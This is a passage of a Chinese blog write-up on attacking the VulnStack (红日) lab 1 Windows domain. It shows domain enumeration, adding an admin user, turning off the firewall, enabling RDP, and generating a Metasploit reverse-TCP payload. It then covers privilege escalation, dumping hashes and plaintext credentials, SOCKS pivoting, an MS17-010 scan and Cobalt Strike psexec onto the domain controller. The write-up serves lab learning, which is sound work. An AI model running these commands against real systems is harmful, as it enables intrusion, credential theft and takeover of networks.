+</span></span><span style="display:flex;"><span> net user                 <span style="color:#75715e"># 查看本机用户列表</span>
+</span></span><span style="display:flex;"><span> net user /domain         <span style="color:#75715e"># 查看域用户</span>
+</span></span><span style="display:flex;"><span> net localgroup administrators    <span style="color:#75715e"># 查看本地管理员组（通常会有域用户）</span>
+</span></span><span style="display:flex;"><span> net view /domain         <span style="color:#75715e"># 查看有几个域</span>
+</span></span><span style="display:flex;"><span> net user 用户名 /domain   <span style="color:#75715e"># 获取指定域用户的信息</span>
+</span></span><span style="display:flex;"><span> net group /domain        <span style="color:#75715e"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span>
+</span></span><span style="display:flex;"><span> net group 组名 /domain    <span style="color:#75715e"># 查看域中某工作组</span>
+</span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain  <span style="color:#75715e"># 查看域管理员的名字</span>
+</span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;domain computers&#34;</span> /domain  <span style="color:#75715e"># 查看域中的其他主机名</span>
+</span></span><span style="display:flex;"><span> net group <span style="color:#e6db74">&#34;doamin controllers&#34;</span> /domain  <span style="color:#75715e"># 查看域控制器（可能有多台）</span>
+</span></span></code></pre></div><p>权限是administrator</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_17.png" alt=""  /></p>
+<p>发现有内网网段</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_18.png" alt=""  /></p>
+<p>查看域用户</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_19.png" alt=""  /></p>
+<p>查看域管理员信息</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_20.png" alt=""  /></p>
+<p>整理一下收集到的win域信息</p>
+<p>该域名为god.org，域控为OWA，域管理员为Administrator，内网网段为192.168.52.1/24，我们用ping命令探测域控的ip</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_21.png" alt=""  /></p>
+<p>域控的ip为192.168.52.138</p>
+<h3 id="尝试rdp">尝试rdp</h3>
+<p>接下来在win7机器上增加用户，看能不能rdp上去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net user l1uyun aBc12@liuyun
+</span></span><span style="display:flex;"><span>net localgroup administrators l1uyun /add
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_22.png" alt=""  /></p>
+<p>查看3389端口是否开启,没有启动的话就手动启动一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>关闭防火墙
+</span></span><span style="display:flex;"><span>netsh advfirewall set allprofiles state off
+</span></span><span style="display:flex;"><span>查看是否开启
+</span></span><span style="display:flex;"><span>netstat -ano | find <span style="color:#e6db74">&#34;3389&#34;</span>
+</span></span><span style="display:flex;"><span>没有开启的话手动开启3389端口
+</span></span><span style="display:flex;"><span>REG ADD HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\T</span>erminal<span style="color:#e6db74">&#34; &#34;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">00000000</span> /f 
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_23.png" alt=""  /></p>
+<p>成功rdp上去了</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_24.png" alt=""  /></p>
+<h3 id="msf上线">msf上线</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.71.101 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">10010</span> -f exe -o shell.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msfconsole -q
+</span></span><span style="display:flex;"><span>use exploit/multi/handler 
+</span></span><span style="display:flex;"><span>set payload windows/meterpreter/reverse_tcp 
+</span></span><span style="display:flex;"><span>set lhost 192.168.71.101
+</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">10010</span>              
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>这里最开始wsl是镜像网络, 后面改成桥接之后才成功反弹回去
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_25.png" alt=""  /></p>
+<h3 id="getsystem提权">getsystem提权</h3>
+<p>提权,使用meterpreter里面的getsystem一键提权
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_26.png" alt=""  /></p>
+<h3 id="迁移进程">迁移进程</h3>
+<p>使用ps查看进程信息,msf的进程pid为5060,apache的为2860,进行进程迁移</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_27.png" alt=""  /></p>
+<p>迁移,然后清除痕迹</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_28.png" alt=""  /></p>
+<h3 id="收集凭据">收集凭据</h3>
+<p>获取hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; hashdump
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>l1uyun:1009:aad3b435b51404eeaad3b435b51404ee:e632033e620c600f68dc60c32b103d8c:::
+</span></span><span style="display:flex;"><span>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></code></pre></div><p>这里需要进一步使用Mimikatz来提取凭证、密码和其他敏感信息。</p>
+<p>在msf中是使用kiwi来进行平替</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_29.png" alt=""  /></p>
+<p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。
+所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制</p>
+<p>因为还需要system的权限,所以只能迁移到system用户的进程中</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_30.png" alt=""  /></p>
+<p>获取到明文凭证
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_31.png" alt=""  /></p>
+<h3 id="搭建socks隧道">搭建socks隧道</h3>
+<p>第一次使用msf来搭socks,之前都是在用frp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run post/multi/manage/autoroute        <span style="color:#75715e">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span>
+</span></span></code></pre></div><p>这里为啥要使用autoroute这个模块呢</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_32.png" alt=""  /></p>
+<p>使用auxiliary/server/socks_proxy模块来实现socks</p>
+<p>先background把现在的meterpreter会话挂起,然后加载这个模块</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_33.png" alt=""  />
+查看jobs可以看到后台运行的socks进程</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_34.png" alt=""  /></p>
+<h3 id="主机探测">主机探测</h3>
+<p>使用arp-scanner模块进行内网的扫描</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/windows/gather/arp_scanner
+</span></span><span style="display:flex;"><span>set RHOSTS 192.168.52.0/24
+</span></span><span style="display:flex;"><span>sessions  <span style="color:#75715e"># 查看session列表</span>
+</span></span><span style="display:flex;"><span>set session <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>windows/gather/arp_scanner<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running module against STU1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ARP Scanning 192.168.52.0/24
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>     IP: 192.168.52.1 MAC 00:50:56:c0:00:01 <span style="color:#f92672">(</span>VMware, Inc.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>     IP: 192.168.52.138 MAC 00:0c:29:3f:5d:a9 <span style="color:#f92672">(</span>VMware, Inc.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>     IP: 192.168.52.143 MAC 00:0c:29:a7:c1:a8 <span style="color:#f92672">(</span>VMware, Inc.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>     IP: 192.168.52.141 MAC 00:0c:29:6d:39:34 <span style="color:#f92672">(</span>VMware, Inc.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>     IP: 192.168.52.255 MAC 00:0c:29:a7:c1:a8 <span style="color:#f92672">(</span>VMware, Inc.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>     IP: 192.168.52.254 MAC 00:50:56:eb:1e:41 <span style="color:#f92672">(</span>VMware, Inc.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
+</span></span></code></pre></div><p>当前机器的ip是192.168.52.143,域控的是192.168.52.138
+所以说目前内网里面有三台机器138,141,143</p>
+<p>还可以使用ping来做主机探测</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;for /L %I in <span style="color:#f92672">(</span>1,1,254<span style="color:#f92672">)</span> DO @ping -w <span style="color:#ae81ff">1</span> -n <span style="color:#ae81ff">1</span> 192.168.52.%I | findstr <span style="color:#e6db74">&#34;TTL=&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> /L %I in <span style="color:#f92672">(</span>1,1,254<span style="color:#f92672">)</span> DO @ping -w <span style="color:#ae81ff">1</span> -n <span style="color:#ae81ff">1</span> 192.168.52.%I | findstr <span style="color:#e6db74">&#34;TTL=&#34;</span>
+</span></span><span style="display:flex;"><span>���� 192.168.52.138 �Ļظ�: �ֽ�<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> ʱ��&lt;1ms TTL<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>���� 192.168.52.141 �Ļظ�: �ֽ�<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> ʱ��&lt;1ms TTL<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>���� 192.168.52.143 �Ļظ�: �ֽ�<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> ʱ��&lt;1ms TTL<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>
+</span></span></code></pre></div><h3 id="端口扫描-1">端口扫描</h3>
+<p>扫一下域控的端口</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>windows/gather/arp_scanner<span style="color:#f92672">)</span> &gt; use auxiliary/scanner/portscan/tcp
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/portscan/tcp<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>auxiliary/scanner/portscan/tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name         Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----         ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   CONCURRENCY  <span style="color:#ae81ff">10</span>               yes       The number of concurrent ports to check p  
+</span></span><span style="display:flex;"><span>                                           er host
+</span></span><span style="display:flex;"><span>   DELAY        <span style="color:#ae81ff">0</span>                yes       The delay between connections, per thread  
+</span></span><span style="display:flex;"><span>                                           , in milliseconds
+</span></span><span style="display:flex;"><span>   JITTER       <span style="color:#ae81ff">0</span>                yes       The delay jitter factor <span style="color:#f92672">(</span>maximum value by  
+</span></span><span style="display:flex;"><span>                                            which to +/- DELAY<span style="color:#f92672">)</span> in milliseconds.      
+</span></span><span style="display:flex;"><span>   PORTS        1-10000          yes       Ports to scan <span style="color:#f92672">(</span>e.g. 22-25,80,110-900<span style="color:#f92672">)</span>      
+</span></span><span style="display:flex;"><span>   RHOSTS                        yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.meta  
+</span></span><span style="display:flex;"><span>                                           sploit.com/docs/using-metasploit/basics/u  
+</span></span><span style="display:flex;"><span>                                           sing-metasploit.html
+</span></span><span style="display:flex;"><span>   THREADS      <span style="color:#ae81ff">1</span>                yes       The number of concurrent threads <span style="color:#f92672">(</span>max one  
+</span></span><span style="display:flex;"><span>                                            per host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   TIMEOUT      <span style="color:#ae81ff">1000</span>             yes       The socket connect timeout in millisecond  
+</span></span><span style="display:flex;"><span>                                           s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/portscan/tcp<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.52.138
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.52.138
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/portscan/tcp<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:53 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:80 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:88 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:139 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:135 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:389 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:445 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:464 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:593 - TCP OPEN
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:       - 192.168.52.138:636 - TCP OPEN
+</span></span></code></pre></div><p>445端口是开放的,扫一下永恒之蓝</p>
+<h3 id="ms17_010永恒之蓝">ms17_010永恒之蓝</h3>
+<p>这里可以确定域控机器上是有永恒之蓝的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:445    - Host is likely VULNERABLE to MS17-010! - Windows Server <span style="color:#ae81ff">2008</span> R2 Datacenter <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.52.138:445    - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts 
+</span></span></code></pre></div><p>但是尝试了msf的exploit/windows/smb/ms17_010_eternalblue和 exploit/windows/smb/ms17_010_psexec都失败了</p>
+<p>最后这个执行命令的可以用</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_35.png" alt=""  /></p>
+<p>那就添加一个用户,然后rdp上去算了
+先添加一个用户</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_36.png" alt=""  /></p>
+<p>查看添加的用户,添加成功</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_37.png" alt=""  /></p>
+<p>给管理员权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND net localgroup administrators hack /add
+</span></span><span style="display:flex;"><span>set COMMAND net localgroup administrators
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_38.png" alt=""  /></p>
+<p>3389是关闭的,尝试开启3389</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_39.png" alt=""  /></p>
+<p>这边是显示已经开启了的,但是还是连不上去</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_40.png" alt=""  /></p>
+<p>原来是防火墙没关</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND  <span style="color:#e6db74">&#39;netsh advfirewall set allprofiles state off&#39;</span>
+</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_41.png" alt=""  /></p>
+<p>这里为啥凭据会是错误的&hellip;.我在虚拟机界面是可以使用这个凭据登进去的&hellip;</p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_42.png" alt=""  /></p>
+<h3 id="cs上线">cs上线</h3>
+<p>看了不少wp都是用cs拿的域控
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_43.png" alt=""  />
+另一边连接cs_server
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_44.png" alt=""  />
+启动监听器
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_45.png" alt=""  />
+生成payload
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_46.png" alt=""  />
+然后在蚁剑上上传进去,并执行,这边很快的显示弹回来了
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_47.png" alt=""  />
+之后再beacon进行交互</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sleep <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># 进入交互模式</span>
+</span></span><span style="display:flex;"><span>getsystem <span style="color:#75715e"># 提权</span>
+</span></span><span style="display:flex;"><span>net view <span style="color:#75715e"># 查看当前网络中的其他机器</span>
+</span></span></code></pre></div><p>查看完之后再target视图中可以看到其他机器了,如果没有的话就扫描一下
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_48.png" alt=""  />
+然后右键,选择psexec64
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_49.png" alt=""  />
+新建一个用于psexec的监听器,然后
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_50.png" alt=""  />
+运行之后就能拿到shell了,换成cs之后,很容易的就拿到了域控的shell
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_51.png" alt=""  /></p>
+<p>最后以同样的方法,使用psexec32上线win2003机器
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_52.png" alt=""  /></p>
+<h1 id="l1uyun">l1uyun</h1>
+<p>第一次打win域的机器,过段时间再打一下这台机器,这次是在学习打win域的流程了</p>
+<p>这机器拖了好久才弄完&hellip;</p>
+<h1 id="links">links</h1>
+<p><a href="https://www.yuki8888.top/article/3a457dac-b9c6-4be9-a7fe-6cbd45438b9b#7f2446c1dab041b9a6b0a8ee81c4adc8" target="_blank" rel="noopener nofollow noreferrer" >记录红日靶场一 | yuki’s Blog</a></p>
+<p><a href="https://blog.csdn.net/braty_/article/details/133283870" target="_blank" rel="noopener nofollow noreferrer" >红日-VulnStack靶场-ATT&amp;CK（一）横向渗透两种方法_红日内网渗透靶场-CSDN博客</a></p>
+<p><a href="http://www.giraffexiu.love/index.php/2024/03/08/cobalt-strike%e5%ae%89%e8%a3%85%e5%8f%8a%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/" target="_blank" rel="noopener nofollow noreferrer" >cobalt strike安装及使用方法 – 学习笔记</a></p>
+<p><a href="https://mp.weixin.qq.com/s/A3MIuT7RXTIIPNLjF42OTg" target="_blank" rel="noopener nofollow noreferrer" >实战 ｜ 记一次基础的内网Vulnstack靶机渗透一</a></p>
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://l1uyun.one/tags/sec/">sec</a>&nbsp;
+        
+      </span>
+    
+  
+    <div class="clear"></div>
+    
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            
+              <span class="pagination__title-h">阅读更多</span>
+            
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">phpmyadmin-4.8.1远程文件包含</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://l1uyun.one/posts/puff-pastry%E6%89%93%E9%9D%B6/">
+                  <span class="button__text">Puff-Pastry打靶</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+    </div>
+
+      </div>
+
+      
+        
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+
+
+
+
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div class="copyright copyright-font">
+      <span>共 46742 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+    </div>
+      
+    <div class="busuanzi-footer">
+      本站总访客数 <span id="vercount_value_site_uv">Loading</span> 人
+      本站总访问量 <span id="vercount_value_site_pv">Loading</span> 次
+    </div>
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a> Theme by <a href="https://github.com/lmm214/immmmm/tree/master/themes/hello-friend" target="_blank" rel="noopener">immmmm</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script type="text/javascript" src="/theme-main-1.js"></script>
+<script type="text/javascript" src="/lately.min.js"></script>
+<script type="text/javascript" src="/waterfall.min.js"></script>
+<script type="text/javascript" src="/imgStatus.min.js"></script>
+<script type="text/javascript" src="/view-image.js"></script>
+<script type="text/javascript" src="/theme-lmm-20230123.js"></script>
+<script type="text/javascript" src="/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    pangu.autoSpacingPage();
+  });
+</script>
+
+
+
+
+    <section class="comments">
+      <script
+        src="https://utteranc.es/client.js"
+        repo="L1uYun/l1uyun_blog"
+        issue-term="title"
+        label="💬comment"
+        theme="github-light"
+        crossorigin="anonymous"
+        async
+      ></script>
+    </section>
+    
+      
+    </div>
+  </body>
+</html>
